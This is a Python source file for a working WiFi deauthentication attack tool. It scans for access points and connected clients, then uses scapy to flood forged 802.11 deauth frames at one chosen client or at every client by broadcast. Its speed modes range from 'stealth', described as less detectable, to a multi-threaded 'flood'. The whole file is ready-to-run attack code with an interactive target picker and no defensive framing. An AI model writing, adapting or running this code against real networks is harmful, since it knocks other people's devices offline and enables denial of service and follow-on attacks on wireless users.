#!/usr/bin/env python3
"""
Deauth Attack Tool v3.0 - Professional Edition
Usage: sudo deauth -i wlan0 -a AA:BB:CC:DD:EE:FF
"""

import os
import sys
import time
import argparse
import subprocess
import threading
from scapy.all import *

# Warna
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[0m'

banner = f"""{R}
    ╔═══════════════════════════════════════════════════════╗
    ║     DEAUTH ATTACK TOOL v3.0 - Professional Edition    ║
    ║     WiFi Deauthentication Attack Framework            ║
    ╚═══════════════════════════════════════════════════════╝{W}
"""

def enable_monitor(interface):
    """Aktifkan monitor mode dengan auto-detection"""
    subprocess.run(f'airmon-ng check kill', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    result = subprocess.run(f'airmon-ng start {interface}', shell=True, capture_output=True, text=True)
    
    if 'mon' in result.stdout:
        return f'{interface}mon'
    
    # Fallback manual
    subprocess.run(f'ifconfig {interface} down', shell=True)
    subprocess.run(f'iwconfig {interface} mode monitor', shell=True)
    subprocess.run(f'ifconfig {interface} up', shell=True)
    return interface

def disable_monitor(interface):
    """Kembalikan ke managed mode"""
    subprocess.run(f'airmon-ng stop {interface}mon', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run('systemctl restart NetworkManager', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_networks(mon_interface, duration=10):
    """Scan jaringan dan client"""
    print(f'{B}[*] Scanning {duration} detik...{W}')
    aps = {}
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2
            ssid = pkt.info.decode() if pkt.info else 'Hidden'
            if bssid not in aps:
                channel = 0
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 3:
                            channel = ord(elt.info)
                            break
                        elt = elt.next
                aps[bssid] = {'ssid': ssid, 'channel': channel}
                print(f'{G}[AP] {ssid[:25]:25} | {bssid} | Ch{channel}{W}')
    
    sniff(iface=mon_interface, prn=handler, timeout=duration, store=0)
    return aps

def scan_clients(mon_interface, target_bssid, channel, duration=15):
    """Scan client yang terhubung ke AP target"""
    print(f'{B}[*] Scanning client di channel {channel}...{W}')
    subprocess.run(f'iwconfig {mon_interface} channel {channel}', shell=True, stderr=subprocess.DEVNULL)
    
    clients = set()
    
    def handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.addr1 == target_bssid and pkt.addr2:
                clients.add(pkt.addr2)
                print(f'{C}[+] Client: {pkt.addr2}{W}')
            elif pkt.addr2 == target_bssid and pkt.addr1:
                clients.add(pkt.addr1)
                print(f'{C}[+] Client: {pkt.addr1}{W}')
    
    sniff(iface=mon_interface, prn=handler, timeout=duration, store=0)
    return list(clients)

def aggressive_deauth(mon_interface, target_ap, target_client, count, rate='aggressive'):
    """
    Deauth attack dengan berbagai mode kekuatan
    
    Rate modes:
    - aggressive: 100 packet/detik (burst)
    - normal: 20 packet/detik
    - stealth: 5 packet/detik
    - flood: 500+ packet/detik (multi-thread)
    """
    
    if target_client == 'ff:ff:ff:ff:ff:ff':
        client_display = 'BROADCAST (all clients)'
    else:
        client_display = target_client
    
    print(f'{R}[!] LAUNCHING DEAUTH ATTACK!{W}')
    print(f'    Target AP    : {target_ap}')
    print(f'    Target Client: {client_display}')
    print(f'    Attack Mode  : {rate.upper()}')
    print(f'    Packet Count : {f"Unlimited (until Ctrl+C)" if count == -1 else count}')
    print(f'{R}[!] Press Ctrl+C to stop{W}')
    
    # Atur kecepatan berdasarkan mode
    rate_settings = {
        'stealth': (0.2, 1),      # delay, burst size
        'normal': (0.05, 5),
        'aggressive': (0.01, 20),
        'flood': (0.001, 100)
    }
    delay, burst = rate_settings.get(rate, (0.01, 20))
    
    # Build packet
    base_packet = RadioTap() / Dot11(
        addr1=target_client,
        addr2=target_ap,
        addr3=target_ap,
        type=0,
        subtype=12
    ) / Dot11Deauth(reason=7)
    
    # Reason codes yang berbeda (biar lebih efektif)
    reasons = [1, 2, 3, 4, 5, 6, 7, 8]
    
    sent = 0
    try:
        if rate == 'flood':
            # Multi-thread flood attack
            def flood_sender():
                nonlocal sent
                while count == -1 or sent < count:
                    for _ in range(burst):
                        if count != -1 and sent >= count:
                            break
                        pkt = base_packet / Dot11Deauth(reason=reasons[sent % len(reasons)])
                        sendp(pkt, iface=mon_interface, verbose=False)
                        sent += 1
                    time.sleep(delay)
            
            threads = []
            for _ in range(5):
                t = threading.Thread(target=flood_sender)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
        else:
            # Single-thread dengan burst
            while count == -1 or sent < count:
                for _ in range(burst):
                    if count != -1 and sent >= count:
                        break
                    pkt = base_packet / Dot11Deauth(reason=reasons[sent % len(reasons)])
                    sendp(pkt, iface=mon_interface, verbose=False)
                    sent += 1
                
                if sent % 50 == 0 and sent > 0:
                    print(f'    Packets sent: {sent}')
                time.sleep(delay)
    
    except KeyboardInterrupt:
        print(f'\n{Y}[!] Attack stopped by user{W}')
    
    print(f'{G}[+] Attack finished. {sent} packets sent.{W}')

def interactive_mode():
    """Mode interaktif (tanpa argument)"""
    clear_screen()
    print(banner)
    
    # Pilih interface
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = [line.split()[0] for line in result.stdout.split('\n') if 'IEEE 802.11' in line]
    
    if not interfaces:
        print(f'{R}[!] No wireless interface found{W}')
        sys.exit(1)
    
    print(f'{B}[+] Available interfaces:{W}')
    for i, iface in enumerate(interfaces):
        print(f'    [{i}] {iface}')
    
    choice = input(f'{Y}\nSelect interface [0]: {W}') or '0'
    interface = interfaces[int(choice)]
    
    # Enable monitor mode
    print(f'{B}[*] Enabling monitor mode...{W}')
    mon_iface = enable_monitor(interface)
    print(f'{G}[+] Monitor mode: {mon_iface}{W}')
    
    try:
        # Scan networks
        input(f'{Y}[ENTER] to scan networks{W}')
        aps = scan_networks(mon_iface, 12)
        
        if not aps:
            print(f'{R}[!] No access points found{W}')
            return
        
        # Select target AP
        print(f'\n{B}[+] Access Points:{W}')
        ap_list = list(aps.keys())
        for i, bssid in enumerate(ap_list):
            print(f'    [{i}] {aps[bssid]["ssid"]} | {bssid} | Ch{aps[bssid]["channel"]}')
        
        ap_choice = int(input(f'{Y}\nSelect target AP: {W}'))
        target_ap = ap_list[ap_choice]
        target_channel = aps[target_ap]['channel']
        
        # Scan clients
        clients = scan_clients(mon_iface, target_ap, target_channel, 10)
        
        if clients:
            print(f'\n{B}[+] Clients:{W}')
            for i, mac in enumerate(clients):
                print(f'    [{i}] {mac}')
            print(f'    [a] ALL CLIENTS (broadcast)')
            
            client_choice = input(f'{Y}\nSelect target [0/a]: {W}') or '0'
            if client_choice.lower() == 'a':
                target_client = 'ff:ff:ff:ff:ff:ff'
            else:
                target_client = clients[int(client_choice)]
        else:
            print(f'{Y}[!] No clients found, using broadcast{W}')
            target_client = 'ff:ff:ff:ff:ff:ff'
        
        # Attack settings
        print(f'\n{B}[+] Attack Mode:{W}')
        print(f'    [1] Stealth   (slow, less detectable)')
        print(f'    [2] Normal    (balanced)')
        print(f'    [3] Aggressive (fast, recommended)')
        print(f'    [4] FLOOD     (ULTRA FAST, multi-thread)')
        
        mode_choice = input(f'{Y}\nSelect mode [3]: {W}') or '3'
        modes = {'1': 'stealth', '2': 'normal', '3': 'aggressive', '4': 'flood'}
        attack_mode = modes.get(mode_choice, 'aggressive')
        
        count = input(f'{Y}\nPacket count [0=unlimited, default=100]: {W}') or '100'
        count = -1 if count == '0' else int(count)
        
        # Execute attack
        aggressive_deauth(mon_iface, target_ap, target_client, count, attack_mode)
        
    except KeyboardInterrupt:
        print(f'\n{Y}[!] Cancelled{W}')
    finally:
        print(f'{B}[*] Cleaning up...{W}')
        disable_monitor(mon_iface)
        print(f'{G}[+] Done!{W}')

def main():
    parser = argparse.ArgumentParser(description='WiFi Deauthentication Attack Tool')
    parser.add_argument('-i', '--interface', help='Wireless interface (e.g., wlan0)')
    parser.add_argument('-a', '--ap', help='Target AP MAC address')
    parser.add_argument('-c', '--client', help='Target client MAC (default: broadcast)')
    parser.add_argument('-n', '--count', type=int, default=50, help='Number of packets (-1 for unlimited)')
    parser.add_argument('-m', '--mode', choices=['stealth', 'normal', 'aggressive', 'flood'], default='aggressive', help='Attack speed mode')
    parser.add_argument('--scan', action='store_true', help='Scan networks and exit')
    parser.add_argument('--scan-clients', action='store_true', help='Scan clients of AP')
    
    args = parser.parse_args()
    
    # Cek root
    if os.geteuid() != 0:
        print(f'{R}[!] Must be root! Use: sudo {sys.argv[0]}{W}')
        sys.exit(1)
    
    # Mode interaktif kalo gak ada argument
    if not args.interface and not args.scan:
        interactive_mode()
        return
    
    # Mode scan doang
    if args.scan:
        if not args.interface:
            print(f'{R}[!] Interface required for scan. Use: -i wlan0 --scan{W}')
            sys.exit(1)
        
        mon_iface = enable_monitor(args.interface)
        print(banner)
        aps = scan_networks(mon_iface)
        if args.scan_clients and aps:
            ap_list = list(aps.keys())
            for i, bssid in enumerate(ap_list):
                print(f'\n{B}[*] Scanning clients for {aps[bssid]["ssid"]}{W}')
                clients = scan_clients(mon_iface, bssid, aps[bssid]['channel'])
                for client in clients:
                    print(f'    {client}')
        disable_monitor(mon_iface)
        return
    
    # Mode attack pake argument
    if not args.ap:
        print(f'{R}[!] Target AP MAC required. Use: -a AA:BB:CC:DD:EE:FF{W}')
        sys.exit(1)
    
    client = args.client if args.client else 'ff:ff:ff:ff:ff:ff'
    
    print(banner)
    mon_iface = enable_monitor(args.interface)
    
    try:
        aggressive_deauth(mon_iface, args.ap, client, args.count, args.mode)
    finally:
        disable_monitor(mon_iface)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

if __name__ == '__main__':
    main()
